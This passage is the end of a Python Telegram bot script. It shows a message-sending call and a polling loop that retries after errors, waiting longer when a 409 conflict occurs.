        else: 
            bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True)

    # Fix for Conflict error: skip pending updates
    while True:
        try:
            bot.infinity_polling(timeout=90, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f"⚠️ Polling Error: {e}")
            # If conflict (409), wait longer to allow other instance to close
            if "409" in str(e):
                time.sleep(15)
            else:
                time.sleep(5)

if __name__ == "__main__":
    main()
